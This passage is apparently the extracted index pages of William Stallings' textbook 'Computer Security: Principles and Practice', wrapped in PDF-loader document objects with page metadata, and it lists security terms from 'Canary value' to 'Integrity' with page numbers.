357–361\\nstack, 347–364\\nstack values, 345\\nBuffer overrun. See Buffer overflow\\nBUFSIZ constant, 354\\nBusiness continuity and disaster recovery, 464\\nBusiness use only policy, 560\\nC\\nCalling function, 348\\nCanary value, 368\\nCanonicalization, 394, 415\\nZ16_STAL0611_04_GE_IDX.indd   782 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 784, 'page_label': '783'}, page_content='INDEX  783\\nCapability, 495\\nCapability tickets, 133–134, 715\\nCard access number (CAN), 107 , 109\\nCard authentication key (CAK), 546\\nCardholder unique identifier (CHUID), 545\\nCardinality, RBAC roles, 148\\nCascaded access right, 186\\nCascading authorizations, 185–186\\nCentralized administration, 183\\nCERT. See Computer Emergency Response Team (CERT)\\nCertificate authority (CA), 74, 323, 427 , 713, 716\\nCertificate revocation list (CRL), 715\\nCertificates\\nattribute, 715\\nconventional (long-lived), 715\\nproxy, 715\\npublic-key, 74–75\\nshort-lived, 715\\nX.509, 75\\nCertification, 38\\ncross, 718\\nservice, 686\\nChallenge-response protocol, 115–116, 118–119, 124\\nChange Cipher Spec Protocol, 692\\nChange management, 523\\nChannel, 45–46, 582, 609, 642, 723\\nCharge-coupled device (CCD), 79\\nChernobyl virus, 227\\nChoreographic works, copyrighted, 606\\nChroot jail, 406, 432–433\\nChroot system, 432\\nChroot system function, 406\\nCHUID digital signature, 544–545\\nCIA triad, 25\\nCipher block chaining (CBC) mode, 645–647\\nCipher feedback (CFB) mode, 647–648\\nCipherSuite, 693\\nCiphertext, 54, 68, 628, 629\\npublic-key encryption, 68\\nsymmetric encryption, 54\\nCiphertext-only attacks, 629–630\\nCircuit-level gateway/circuit-level proxy, 319–320\\nCIRT. See Computer incident response team (CIRT)\\nClaimant, 88\\nClass, 132, 142, 149, 275, 369, 373, 386, 391, 514, 614–615\\nClearinghouse, 609\\nClear-signed data, 684\\nClickjacking, 224\\nClient, 192\\nClient attacks, 118–119\\nCloud auditor, 452, 453\\nCloud broker, 452, 453\\nCloud carrier, 452, 453\\nCloud computing\\nabuse and nefarious, 458\\naddressing security concerns, 456–457\\ncloud deployment models, 449–451\\ncloud security service, 460–464\\ncloud service models, 448–449\\ndata protection in, 459–460\\nelements, 446–448\\ninfrastructure as a service (IaaS), 448–449\\ninteractions between actors, 454\\nopen-source security module, 464–465\\nplatform as a service (PaaS), 448\\nreference architecture, 451–454\\nrisks and countermeasures, 457–459\\nsecurity approaches for, 460\\nsecurity issues for, 454–456\\nsoftware as a service (SaaS), 448\\nCloud context and IoT\\nbackbone network, 469\\ncloud, 469–470\\ncore, 469\\nedge, 467–468\\nfog, 468–469\\nCloud deployment models\\ncommunity cloud, 450–451\\ncomparison of, 451\\nhybrid cloud, 451\\nprivate cloud, 450\\npublic cloud, 449–450\\nCloud network, 469–470\\nCloud security alliance, 458–489\\nCloud service consumers (CSCs), 447–448, 452, 460\\nCloud service models, 448–449\\nCloud service provider (CSP), 452, 460\\nClustering and outlier detection, 283\\nCode analysis techniques, 183\\nCode injection attack, 389–390, 405\\nCode of Practice for Information Security Management \\n(ISO\\xa027 ,024), 538, 551, 576, 614–615\\nCode Red II, 220\\nCodes of conduct, 620\\nCode, writing safe programs using, 395–400\\nCollision resistance, 38n2, 65–66\\nCollision resistant hash functions, 65\\nCombined approach, security risk assessment, 490\\nCommand-and-control (C&C) server network, 230\\nCommand injection attack, 388, 414\\nCommon controls, 518\\nCommon Criteria (CC), 573–575, 594, 615\\nassurance level, 398\\nCommunication lines, computer security and, 34\\nCommunications channel (CC), 45\\nCommunication security, 472\\nCommunications facilities and networks, 29\\nCommunity cloud, 450–451\\nCommWarrior worm, 223\\nCompanion key, 68\\nCompany policy, 561\\nCompany rights, 561\\nCompile-time defenses, 364–368\\nComplete mediation, 40\\nComplex password policy, 101\\nCompression function, 665\\nCompression method, 693\\nCompromise, 93, 506\\nComputationally secure, 630\\nComputer crime. See Cybercrime\\nComputer Emergency Response Team (CERT), 44, 342\\nComputer-generated passwords, 101\\nComputer incident response team (CIRT), 563\\nComputer room, 198\\nComputers\\nas storage devices, 602\\nas targets, 601\\nComputer security\\navailability, 28\\nbreach of levels, 26\\ncategories of vulnerabilities, 29\\nchallenges of, 28–29\\nas communications tools, 602\\nconfidentiality, 27\\nconsumers of services and mechanisms, 48\\ncost of security failure, 47\\ndefinition, 24–28\\nease of use vs. security, 47\\nfunctional requirements, 37–39\\nfundamental security design principles, 39–43\\nZ16_STAL0611_04_GE_IDX.indd   783 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 785, 'page_label': '784'}, page_content='784  INDEX\\nComputer security (Continued)\\nhigh level, 27\\nimplementation of, 47–48\\nintegrity, 27–28\\nkey objectives, 25\\nlow level, 26\\nmodel for, 29–31\\nmoderate level, 27\\npolicy, 46–47\\nprivacy, 611–617\\nprivacy and, 25, 27, 35, 161, 601, 608, 611–617\\nscope of, 34\\nstrategy, 46–48\\nsystem resources (assets), 29, 33–35\\nteaching webcasts for, 760\\nterminology, 29\\nthreats to, 31–37\\nComputer security incident response team (CSIRT), 561–568\\ndetecting incidents, 563–564\\ndocumenting incidents, 567\\ninformation flow for incident handling, 567–568\\nresponding to incidents, 565–566\\ntriage function, 564\\nComputing artifact, 623\\nConficker (or Downadup) worm, 221\\nConfidence, 543\\nConfidentiality, 27 , 35, 123, 476, 691\\ncomputer security and, 25, 27, 35\\ndata, 25\\nFamily Education Rights and Privacy Act (FERPA), 27\\nmessage or data authentication without, 60\\npublic-key encryption, 68–69\\nsymmetric encryption and, 53–59\\nthreat to, 31\\nConfiguration management, 34, 37–38, 40, 312, 514, 516–517 , \\n521–524, 593\\nConsent, 617\\nConsequence, 31–33, 35, 67 , 248, 256, 264, 270, 342, 343, 359, 381, \\n383, 386, 389, 393–394, 396, 399–400, 404–406, 414, 427 , \\n429, 436, 481, 485, 489, 494–496, 498–500, 502, 504–507 , \\n518, 523, 621, 637\\nConstant exponentiation time, 674\\nConstituency, 563\\nConsumers, 609, 610\\nContainer virtualization, 439\\nContent management, 610\\nContent ownership, 560\\nContent provider, 609\\nContent-Type HTTP response header, 415\\nContingency planning, 38\\nContinuum learning, 552–553\\nContractual obligations, 552\\nControl, 25, 39, 60, 88, 98, 108, 120, 173, 180, 212, 230, 237 , 239, \\n250, 257–258, 279, 326, 342, 346–348, 351–352, 361, \\n364, 368–370, 375, 392–393, 397 , 400, 402, 406, 408, 410, \\n414–415, 421, 425–426, 428–429, 487 , 492–493, 502–503, \\n505, 511–519, 601\\nConventional (long-lived) certificates, 715\\nCookies, 180\\nCopying of biometric parameter, 119\\nCopyright law, 606\\nCopyrights, intellectual property and, 605\\nCore network, 469, 474\\nCorporate physical security policy, 541–542\\nCorporate security, 321, 485\\nCorrelation, 596\\nCorrupted system, 29\\nCorruption, 32–33, 206, 208, 227–228, 343, 346, 365,  \\n375, 399, 405, 429, 504\\nCost of security failure, 47\\nCountermeasures, 30, 31, 511–519\\nattack strategies and, 92–93\\nbuffer overflow, 364–368\\ncompile-time defenses, 364–368\\ndenial-of-service (DoS) attacks, 265–269\\ndistributed intelligence gathering, 242\\nflooding attacks, 269\\nheap overflows, 372\\nhost-based behavior-blocking software, 240\\nhost-based scanners, 238–241\\nfor malware, 236–238\\nperimeter scanning, 241–242\\nrootkit, 241\\nrun-time defenses, 368–370\\nsafe coding techniques, 365–367\\nsafe libraries, 367\\nspyware detection and removal, 240\\nof SQLi attacks, 183\\nstack protection mechanisms, 367–368\\nCounter (CTR) mode, 648–650\\nCounter mode-CBC MAC Protocol (CCMP), 749\\nCovert channel analysis, 517\\nC programming language, 347\\nCPU emulator, 239\\nCredential management, 156–147\\nCredentials, 87\\nCredential service provider (CSP), 87\\nCredential theft, 231\\nCrimeware, 208, 231\\nCRL issuer, 718\\nCross certification, 718\\nCross connects, 196\\nCross-site scripting attacks (XSS), 391–392\\nCryptanalysis, 54–55, 57 , 65, 67 , 629–631\\nCryptanalytic attacks, 94\\nCryptographic algorithms, 477\\nCryptographic message authentication code, 133\\nCryptographic tools\\nasymmetric encryption algorithms, 71–72\\nconfidentiality, 53–59\\ndigital envelopes, 76–77\\ndigital signatures, 72–76\\nencryption of stored data, 79–80\\nhash functions, 62–67\\nkey management, 60–62\\nmessage authentication, 60–62\\nPretty Good Privacy (PGP), 80\\npseudorandom numbers, 77–79\\npublic-key encryption, 67–76\\nrandom number, 78–79\\nsymmetric encryption, 53–55\\nCryptography, 629. See also Public-key encryption/\\ncryptosystem; Symmetric encryption\\nCSI/FBI Computer Crime and Security Survey, 495\\nCWE/SANS Top 47 Most Dangerous Software Errors list, 381\\nCybercrime, 601–602\\ncited in the convention on cybercrime, 603\\nlaw enforcement challenges, 602–604\\ntypes, 601–602\\nCybercrime victims, 604\\nCyber criminals, 274–275, 603\\nCyber-espionage worm, 221\\nCyberslam, DoS, 250\\nD\\nDAC. See Discretionary access control\\nData, 29, 35\\nbackup, 429\\nconfidentiality, 25, 601\\nZ16_STAL0611_04_GE_IDX.indd   784 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 786, 'page_label': '785'}, page_content='INDEX  785\\nData (Continued)\\ncorrect interpretation of, 398–399\\ndestruction, 227–228\\nfunctions, 573\\ngeneration, 573–574\\nintegrity, 25, 33, 35, 48, 59, 65, 68–69, 74, 123, 287, 601, 657–658\\nleakage or loss, 459\\nowner, 191\\npersonal, 106\\nsharing, 617\\nsource, 299\\nsurveillance and privacy, 615–617\\nswapping, 643\\nvalues, writing correct code for, 398–400\\nData authentication, 476\\nDatabase access control, 183–188\\ncascading authorizations, 185–186\\nfixed database roles, 187\\nfixed server roles, 187\\nrange of administrative policies, 183\\nrole-based, 186–188\\nSQL-based, 184–185\\nuser-defined roles, 187\\nDatabase encryption, 191–194\\ndisadvantages to, 191\\nentities, 191\\nDatabase management system (DBMS), 171–173, 190\\nDatabase RBAC facility, 186\\nDatabases, 171, 608\\nencryption, 191–194\\ninference and, 188–190\\nquery language, 172\\nrelational, 173–177\\nsecurity, need for, 170–171\\nstatistical, 608\\nstorage for logs, 585\\nData center/cloud, 474\\nData center security, 194–199\\nconsiderations, 196–197\\nelements, 195–196\\nTIA-492, 197–199\\nData confidentiality, 749\\nData definition language (DDL), 172\\nData Encryption Algorithm (DEA), 55, 633\\nData Encryption Standard (DES), 53, 633–634, 708\\nData exfiltration, 233\\nData loss prevention (DLP), 463\\nData management security, 472\\nData manipulation language (DML), 172\\narchitecture, 172\\nData protection and confidentiality, 475\\nData protection in cloud computing\\nmulti-instance model, 459\\nmulti-tenant model, 460\\nDeadlock, prevention of, 400\\nDeallocator, 375\\nDecentralized administration, 183\\nDeception, 33\\nDecryption, 56, 57 , 59, 62, 68, 71\\nDecryption algorithm, 54, 68–69, 628, 635, 637 , 647 , 650, 672, 674\\npublic-key encryption, 68\\nsymmetric encryption, 54\\nDefense in depth, 42\\nDefensive coding, 182\\nDefensive programming, 380–384\\nDeletion, access to, 132\\nDenial-of-service (DoS), 36, 725\\nDenial-of-service (DoS) attack, 43, 119, 178, 248–250, 294\\namplification, 257, 261, 264–265\\nclassic, 250\\ncountermeasures, 260, 265–269\\ndistributed, 229, 256–258\\nflooding, 255–256\\nreflection, 261–264\\nresponding to, 269–270\\nsmurf DoS program, 264\\nsource address spoofing, 251–252\\nSQLi attack and, 178\\nSYN spoofing attack, 252–255\\nTribe Flood Network (TFN), 257\\nDES. See Data Encryption Standard (DES)\\n3DES. See Triple DES\\nDesign patents, 607\\nDestructor functions, 375\\nDetailed security risk analysis, 489–490\\nanalysis of risks, 496–500\\ncontext or system characterization, 492–493\\nevaluation of risks, 500\\nidentification of threats/risks/vulnerabilities, 494–496\\nrisk treatment, 501–502\\nSilver Star Mines, risk assessment process, 502–507,  \\n524–527\\nDetecting an attack, 31\\nDetection, 47–48\\nmethods, 182\\nand recovery control, 513\\nDeterrence, 495\\nDevelopers, 556\\nDiffie–Hellman key exchange/key agreement, 71, 76,  \\n674–679\\nDigital content, 608\\nDigital envelopes, 76–77\\nDigital identity, 156\\nDigital immune system, 330–331\\nDigital Millennium Copyright Act (DMCA), 608–609\\nDigital Rights Management (DRM), 609–611\\narchitecture, 611\\nbilling/payments, 611\\ncomponents, 610\\nDigital Signature Algorithm (DSA), 71, 679\\nDigital signatures, 72–77\\nDigital Signature Standard (DSS), 71, 678–679\\nDigital user authentication\\nmeans of, 88–89\\nmodel for, 87–88\\nrisk assessment, 89–92\\nDirected broadcast, 264, 268\\nDirectory information, 27\\nDirectory service access, 583\\nDirectory traversal, 329\\nDisciplinary action, 561\\nDisclosure, 25, 31–35, 42, 50–51, 90, 189, 505, 516, 622\\nDiscretionary access control (DAC), 131–139\\naccess matrix controller, 136\\naccess rights of subjects, 136\\nof devices, 135\\ngeneral model, 134–138\\nlogical or functional point of view, 135\\nof memory locations or regions, 135\\nof processes, 135\\nprotection domains, 138–139\\nrules for transferring, granting, and deleting  \\naccess rights, 136\\ndisplay() function, 354\\nDispute resolvers, 161\\nDisruption, 32–33, 36–37 , 43, 210, 217 , 247 , 604\\nDistributed denial-of-service (DDoS) attacks, 229, 256–258\\nDistributed detection and inference (DDI) events, 297\\nDistributed firewalls, 326–328\\nDistributed host-based intrusion detection, 274\\nZ16_STAL0611_04_GE_IDX.indd   785 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 787, 'page_label': '786'}, page_content='786  INDEX\\nDistributed intrusion prevention system (IPS), 242, 287–289\\narchitecture for, 288\\ncentral manager module, 288\\nhost agent module, 288\\nLAN monitor agent module, 288\\nmajor issues in the design of, 287–288\\nDistributed or hybrid IDS, 279, 297\\nDistribution right, 606\\nDistribution system (DS), 733\\nmessages distribution of, 735\\nDistributor, 609\\nDMZ (demilitarized zone), 301\\nnetworks, 323–325\\nDNS amplification attacks, 265\\nDomain keys identified mail (DKIM), 686–690\\ninternet mail architecture, 687–688\\nstrategy, 688–690\\nDomain name system (DNS), 688\\nDormant phase of virus, 211\\nDoS. See Denial-of-service (DoS)\\nDouble bastion inline, 328\\nDouble bastion T, 328\\nDownloaders, 207\\nDramatic works, copyrighted, 606\\nDrive-by-download attack, 208, 210, 223–224\\nDrone, 229\\nDrop, 331\\nDuqu worm, 221\\nDynamically linked shared libraries, 588\\nDynamic binary rewriting, 591–592\\nDynamic biometric authentication, 109–114\\nDynamic biometric protocol, 117\\nDynamic Host Configuration Protocol (DHCP), 293\\nDynamic Link Libraries (DLLs), 285\\nE\\nEAP exchanges, 743–744\\nEAPOL key encryption key (EAPOL-KEK), 747\\nEAP over LAN (EAPOL) key confirmation key  \\n(EAPOL-KCK), 747\\nEarthquake, 533\\nEavesdropping, 118–119\\nEconomy of mechanism, 40\\nEdge network, 467–468\\nEgress monitors, 241–242\\nElectrically erasable programmable ROM  \\n(EEPROM), 106\\nElectromagnetic interference (EMI) threat, 537\\nElectronic codebook (ECB) mode, 57 , 59, 645, 666\\nElectronic identity (eID) card, 107–109\\nfunctions, 108–109\\nhuman-readable data on, 106\\nPassword Authenticated Connection Establishment \\n(PACE), 109\\nElectronic monitoring, 93\\nElliptic curve cryptography (ECC), 71–72, 679\\nE-mail, 560–561\\nattachment, infected, 220, 225\\nSecure/Multipurpose Internet Mail Extension  \\n(S/MIME), 75, 683–686, 714\\nsecurity, 463\\nspam, 225\\nTrojan horses, 225–226\\nunlawful activity prohibited, 561\\nEmployee behavior, 551\\nEmployees security policy, 561\\nEmployment agreements, 558\\nEmployment practices and policies, 557–560\\nEmulation control module, 239\\nEncapsulating security payload (ESP)\\ninformation, 701\\ntransport mode, 702–703\\ntunnel mode, 703\\nEncapsulation, 42\\nEncrypted virus, 215\\nEncrypting File System (EFS), 435\\nEncryption, 463, 725\\nend-to-end, 650\\nresearch, 608\\nof stored data, application of, 79–80\\nEncryption algorithm. See Asymmetric encryption algorithms, \\nSymmetric encryption\\nEnd entity, 718\\nEnd-of-line comment, 181\\nEnd-to-end encryption, 650\\nEnd user, 186\\nEnroll, 111–112, 120\\nEnterprise cloud computing, 446\\nEnterprise identity, 156\\nEnterprise resource planning (ERP), 454\\nEnterprise-wide access control, 157\\nEntrance room, 198\\nEnveloped data, S/MIME, 684\\nEnvironmental threats\\nchemical, radiological, and biological hazards, 536\\ndust, 536\\nfire and smoke, 534–535\\ninappropriate temperature and humidity, 533–534\\ninfestation, 537\\nwater damage, 535–536\\nEnvironmental variables, software security, 401–404\\nEnvironment attributes, 149\\nePass function, 107 , 108\\nEquipment distribution area (EDA), 199\\nError-detection code, 59\\neSign function, 107\\nEspionage, 232–233\\n/etc/syslog.conf, 584\\nEthics\\ncodes of conduct, 620\\nIEEE Code of Ethics, 622\\nInformation Technology professions, 618\\nissues related to computers and information  \\nsystems, 618–620\\nrules, 623\\nEuropean Union Data Protection Directive, 612\\nEvaluation, 48, 57 , 487 , 490, 497 , 511\\nEvent and audit trail analysis software, tools, and  \\ninterfaces, 576\\nEvent definition, 574\\nEvent detection, 576\\nEvent discriminator, 572\\nEvent recording, 576\\nEvent response, 584–585\\nEvent selection, 574\\nEvent storage, 574\\nExecutable address space protection, 368–369\\nExecute access, 132\\nExecution phase of virus, 212\\nviral structure, 213–214\\nExecutive-level training, 556\\nexecve() system function, 357\\nExploits, 210\\nExposure, 31, 428, 488, 492, 496, 522, 604\\nExtended service set (ESS), 734\\ntransition, 736\\nExtensible Markup Language (XML), 298\\nExtreme Learning Machines (ELM), 285\\nZ16_STAL0611_04_GE_IDX.indd   786 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 788, 'page_label': '787'}, page_content='INDEX  787\\nF\\nFacilities security, 530\\nFactoring problem for RSA algorithms, 672–673\\nFail-safe default, 40\\nFair use, 608\\nFalse negatives, 279, 282\\nFalse positives, 279, 282\\nFalsification, 32–33\\nFamily Educational Rights and Privacy Act (FERPA), 27\\nFederal Information Processing Standards (FIPS), 25–26, 37 , 39, \\n55, 57 , 61, 66, 71, 90, 101, 633, 659, 678\\nPUB 68, 55\\nPUB 202, 66\\nPUB 208, 71\\nPUB 219, 57\\nPUB 221, 25–26\\nPUB 222, 37, 39\\nFederated identity standards and protocols, 154\\nFeistel cipher structure, 631–633\\nfgets() library routine, 354\\nFile access control, 99–100, 139–141\\nFile access system, 329\\nFile infector, 214\\nFile integrity checksums, 285\\nFinger, 293\\nfingerd daemon, 348\\nFIPS. See Federal Information Processing  \\nStandards (FIPS)\\nFirewall projects, 758–759\\nFirewalls. See also Intrusion prevention systems (IPS)\\nactivity patterns, access based on, 313\\napplication-level gateway, 319\\napplication protocol, 313\\nbasing, 320–323\\nbastion host, 320–321\\ncharacteristics and access policy, 312–313\\ncircuit-level gateway/circuit-level proxy, 319–320\\ndistributed, 326–328\\nDMZ networks, 323–325\\nhost-based, 321–322\\nIP address and protocol values, 312\\nlimitations, 313\\nlocation and configurations, 323–328\\nneed for, 311–312\\npacket filtering, 315–317\\npersonal, 322–323\\nscope of, 313\\nstateful inspection, 318–319\\ntypes of, 314–320\\nusers identity, access based on, 313\\nvirtual private networks (VPN), 325\\nFirst-generation scanner, 238\\nFixed database roles, 187\\nFixed server roles, 187\\nFlash crowd, 266\\nFlood, 533\\nFlooders (DoS client), 207\\nFlooding attacks, 255–256\\ndefenses against, 267\\nICMP flood, 255\\nTCP SYN flood, 256\\nUDP flood, 255–256\\nFog computing, 469\\nFog computing devices, 469\\nFog/edge network, 474\\nFog network, 468–469\\nForeign key, 175, 184\\nFormat, 240, 274, 287 , 288, 297–299, 303, 363, 368, 375,  \\n381, 390, 430, 581, 585, 597 , 608, 629, 661, 707 , 714–715\\nFormat string overflows, 375\\nForward add round key transformation (AES), 640\\nForward mix column transformation (AES), 640\\nForward shift row transformation (AES), 638\\nForward substitute byte transformation (AES), 638\\nFourth-generation products, 239\\nFraggle program, 264\\nFreeBSD, 96–97 , 142\\nFTP , 293, 319\\nFunctional requirements, IT security, 37–39\\nFunction call mechanisms, buffer overflow, 348–349\\nFunction returns, 348\\nFuzzing, 394–395\\nFuzzing software tests, 394–395\\nFuzzy logic, 283\\nG\\nGardner, Martin, 71\\nGateways, 267 , 319, 468\\nGeneral role hierarchy, 167\\nGenetic algorithms, 283\\ngetinp() function, 354\\ngets() function, 344, 348, 373\\ngets() library routine, 373\\nGlobal data area overflows, 375\\nGNOME Programming Guidelines, 411\\nGovernance and custodianship, 617\\nGpcode Trojan, 227\\nGraceful failure, 366\\nGRANT command, 184\\nGraphical user interfaces (GUIs), 597\\ngrep program, 402\\nGroup, 71, 132, 140–141, 187 , 274–275, 283, 297 , 399, 403–405, \\n430, 431, 433, 434, 494, 503, 507 , 513, 583, 594, 615, 629, \\n678, 718\\nGroup keys, 744, 747\\nGroup master key (GMK), 747\\nGroup temporal key (GTK), 747\\nGuard pages, 370\\nGuest OS, 436–438\\nH\\nHacker/cracker, 93, 98, 274, 300, 329\\nHacking project, 754–755\\nHacktivists, 275\\nHandling of program input, 384–395\\nHandshake Protocol, TLS, 692–694\\nHardening, 422–426, 429, 431, 433–435\\nHardware, 29, 34, 191\\nefficiency, 649\\nHashed passwords, 94–96\\nHash functions\\napplications of, 66–67\\ncollision resistant, 65\\nHMAC, 663–666\\nintrusion detection and, 67\\nmessage authentication and, 59–67\\none-way, 62–64, 92, 96\\none-way, 657\\npreimage resistant, 65–66\\nsecond preimage resistant, 65\\nsecure, 63–64\\nSecure Hash Algorithm (SHA), 659–662\\nsimple (SHF), 657–659\\nHeap, 372\\nHeap overflow, 372–375\\nHeartbeat Protocol, TLS, 694–695\\nHeartbleed, 696\\nHeating, ventilation, and air-conditioning (HVAC), 534\\nhello function, 351–353\\nZ16_STAL0611_04_GE_IDX.indd   787 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 789, 'page_label': '788'}, page_content='788  INDEX\\nHierarchies, RBAC, 146–147\\nHigh interaction honeypot, 300\\nHMAC, 64, 663–666\\nalgorithm, 664–665\\ndesign objectives, 663–664\\nsecurity of, 665\\nHoneynet Project, 300\\nHoneypots, 300–302\\nfully internal, 302\\nhigh interaction, 300\\nlow interaction, 300\\noutside the external firewall, 301\\nHorizontal cabling, 196\\nHorizontal distribution area (HDA), 198\\nHost attacks, 119\\nHost audit record (HAR), 288–289\\nHost-based behavior-blocking software, 240\\nHost-based detectors, 296\\nHost-based firewalls, 321–322\\nHost-based IDSs (HIDSs), 238–241, 279, 284, 287\\nanomaly, 285–286\\nbenefit of, 284\\ndata sources, 284–285\\ndistributed, 287–289\\nsensors, 284–285\\nsignature or heuristic based, 287\\nHost-based intrusion prevention systems (HIPS), 328–330\\nHosted virtualization, 437 , 438, 442\\nHost input/output, 329\\nHost-resident firewall, 326\\nHTTP flood, 260–261\\nHTTPS (HTTP over SSL), 229\\nHuman attack surface, 43\\nHuman-caused threats, 537–538, 540–541\\nHuman resources security\\ncomputer security incident response team (CSIRT),  \\n561–568\\ne-mail and internet use policies, 560–561\\nemployment practices and policies, 557–560\\nsecurity awareness, training, and education, 551–557\\nHumidity, 533–534\\nHurricanes, 531\\nHybrid cloud, 451\\nHydraq Trojan, 226\\nHypertext transfer protocol (HTTP)\\nconnection closure, 698\\nconnection initiation, 697–698\\nHypertext Transfer Protocol (HTTP)-based attack,  \\n260–261, 293\\nHypervisor, 236, 423, 436–438\\ntype 23, 437\\ntype 24, 437\\nHypervisor security, 440–441\\nI\\nIce storm, 533\\nICMP flood attack, 257\\nIdentification, 38, 86, 108, 110–112, 237 , 266, 284, 494–496,  \\n516, 523\\nIdentifier (ID), 92, 94\\nIdentity and access management (IAM) system, 161, 462\\nIdentity, credential, and access management (ICAM)\\naccess management, 157\\ncredential management, 156–157\\nidentity federation, 157\\nidentity management, 156\\npurpose of, 156\\nIdentity federation, 157\\nIdentity management, 156, 610\\nIdentity providers (IDPs), 161\\nIdentity service provider, 161\\nIdentity theft, 231–232, 724\\nIDS. See Intrusion detection systems (IDS)\\nIEEE 802.11 wireless LAN, 730–736\\narchitectural model, 733–734\\nlogical link control, 733\\nMAC, 732–733\\nnetwork components, 733–734\\nphysical layer, 731–732\\nprotocol architecture, 731–732\\nservices, 734–735\\nIEEE 802.11i wireless LAN, 736–751\\naccess control approach, 742\\nCCMP, 749\\ndiscovery phase, 740–741\\nEAP exchanges, 743–744\\ngroup key distribution, 748\\ngroup keys, 747\\nkey management phase, 744–747\\nMPDU exchange, 743\\noperation, 737–740\\npairwise key distribution, 747–748\\nPRF, 749–751\\nprotected data transfer phase, 749\\nsecurity capabilities, 741\\nservices, 737\\nTKIP, 749\\nIEEE (Institute of Electrical and Electronics Engineers) \\nP1363 Standard for Public-Key Cryptography, 72\\nCode of Ethics, 622\\nIEEE 824.1X access control approach, 742\\nIETF Public Key Infrastructure X.509 (PKIX) model, 718\\nIllegal/logically incorrect queries, 181\\nImplementation plan, 482, 511–512, 520, 526\\nInband attack, 180\\nIncapacitation, 32–33\\nIncident handling, 522, 524\\ninformation flow for, 567–568\\nlife cycle, 566\\nIncident response, 38, 516, 525, 526\\nIndependent BSS (IBSS), 734\\nInfection vector, 211\\nInference, 32, 188–190\\nchannel, 189\\ndatabase security, 188–190\\ndetection at query time, 189\\ndetection during database design, 189\\nexample, 189\\nthreat of disclosure by, 189\\nInferential attack, 181\\nInflexibility, 191\\nInformal approach, security risk assessment, 489\\nInformation Card Foundation (ICF), 160\\nInformation system (IS), 571\\nInformation system hardware, 530\\nInformation technology (IT) security control, 511–519\\nimplementation of, 521\\nmaintenance and monitoring of implemented controls, \\n522–524\\nInformation technology (IT) security management, \\n 511, 521, 523\\ndefinition, 482\\nimplementation of, 511\\nISO/IEC 27,022 series of standards, 482\\norganizational context and security policy, 484–487\\noverview of, 483\\nsafeguards, 28, 487, 511–519\\nInformation technology (IT) security plan, 520–521\\nimplementation of, 521\\nZ16_STAL0611_04_GE_IDX.indd   788 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 790, 'page_label': '789'}, page_content='INDEX  789\\nInformation technology (IT) security risk assessment  \\nprocess, 483\\nbaseline approach, 488–489\\ncombined baseline, informal, and detailed approach, 490\\ndetailed, 489–490\\ninformal approach, 489\\nInformation theft\\ncredential theft, 231\\ndata exfiltration, 233\\nespionage, 232–233\\nidentity theft, 231–232\\nkeyloggers, 231\\nphishing, 206, 210, 224–226, 231–232, 276,  \\n336, 604\\nreconnaissance, 232–233\\nspyware, 231\\nInfrastructure as a service (IaaS), 448–449\\nInfrastructure controls, 518\\nInfrastructure traffic, 441\\nInfringement, intellectual property and, 605–606\\nIngress monitors, 241\\nInjection attack, 177–183, 386–390\\nInline sensor, 290, 303\\nInput fuzzing, 394–395\\nInsecure interfaces, 458\\nInside attack, 31\\nInstructor’s Resource Center (IRC), 754\\ncase studies, 759\\nInteger overflows, 375\\nIntegration of security policies and techniques, 472\\nIntegrity, 25, 27 , 